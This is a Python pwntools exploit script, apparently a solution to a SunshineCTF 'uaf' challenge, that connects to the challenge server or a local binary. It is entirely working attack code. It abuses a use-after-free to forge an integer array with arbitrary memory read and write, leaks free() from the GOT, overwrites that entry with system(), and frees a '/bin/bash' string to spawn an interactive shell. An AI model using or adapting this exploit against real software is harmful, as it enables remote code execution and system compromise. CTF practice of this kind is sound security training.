from pwn import *

REMOTE = 1

exe = ELF("uaf")


def menu(r, choice):
	r.recvuntil("(>) ")
	r.sendline(str(choice))


def createText(r, text):
	menu(r, 2)
	r.recvuntil("Enter a text string:\n")
	r.sendline(text)
	r.recvuntil("ID of text string: ")
	textID = int(r.recvline().strip())
	return textID


def createIntArray(r, ints):
	menu(r, 1)
	r.recvuntil("How many integers?\n")
	r.sendline(str(len(ints)))
	r.recvuntil("integers:\n")
	r.sendline(" ".join(map(str, ints)))
	r.recvuntil("ID of integer array: ")
	arrID = int(r.recvline().strip())
	return arrID


def enterObjectID(r, objID):
	r.recvuntil("Enter object ID:\n")
	r.sendline(str(objID))


def deleteIntArray(r, arrID):
	menu(r, 6)
	enterObjectID(r, arrID)


def deleteTextString(r, textID):
	menu(r, 7)
	enterObjectID(r, textID)


def getIntegerArray(r, arrID):
	menu(r, 4)
	enterObjectID(r, arrID)
	r.recvuntil("Integer array:\n[")
	arrContents = r.recvuntil("]")[:-1]
	return map(int, arrContents.split(", "))


def createFakeArray(r, count, ptr):
	arrID = createIntArray(r, [1, 2, 3, 4])
	deleteIntArray(r, arrID)
	
	fakeArray = ""
	fakeArray += p32(count)
	fakeArray += p32(ptr)
	
	textID = createText(r, fakeArray)
	
	if arrID != textID:
		warn("Failed to replace int array with text string")
	
	return arrID


def editArray(r, arrID, index, value):
	menu(r, 3)
	enterObjectID(r, arrID)
	r.recvuntil("Enter index to change:\n")
	r.sendline(str(index))
	r.recvuntil("Enter new value:\n")
	r.sendline(str(value))


def read32(r, fakeID):
	arr = getIntegerArray(r, fakeID)
	
	if len(arr) != 1:
		warn("Array length unexpected: %d" % len(arr))
	
	return arr[0]


def write32(r, fakeID, value, index=0):
	editArray(r, fakeID, index, value)


def connect_remote():
	global libc
	libc = ELF("uaf-libc.so")
	return remote("pwn.sunshinectf.org", 20001)

def connect_local():
	global libc
	libc = ELF("/lib/i386-linux-gnu/libc.so.6")
	r = exe.process()
	gdb.attach(r, "c")
	return r

def main():
	context(binary=exe)
	
	if REMOTE:
		r = connect_remote()
	else:
		r = connect_local()
	
	# Step 1: Create "/bin/bash" string in memory
	binshID = createText(r, "/bin/bash")
	info("/bin/sh at 0x%x" % binshID)
	
	# Step 2: Create first int array object
	arr1ID = createIntArray(r, [0])
	info("Array1 at 0x%x" % arr1ID)
	
	# Step 3: Create fake array to overwrite arr1.ints
	fakeID = createFakeArray(r, 0x41414141, arr1ID + 4)
	info("Fake integer array at 0x%x" % fakeID)
	
	# Step 4: Set arr1.ints to address of free in the GOT
	free_got = exe.got["free"]
	info("&free.got is 0x%x" % free_got)
	write32(r, fakeID, free_got)
	
	# Step 5: Read address of free() in libc
	free_addr = read32(r, arr1ID)
	info("&free at 0x%x" % free_addr)
	
	# Step 6: Calculate address of system()
	free_to_system = libc.symbols["system"] - libc.symbols["free"]
	system_addr = free_addr + free_to_system
	info("&system at 0x%x" % system_addr)
	
	# Step 7: Replace free() with system()
	write32(r, arr1ID, system_addr)
	
	# Step 8: Delete text string "/bin/bash" to get shell
	deleteTextString(r, binshID)
	
	# Step 9: Interact with shell
	r.interactive()


if __name__ == "__main__":
	main()
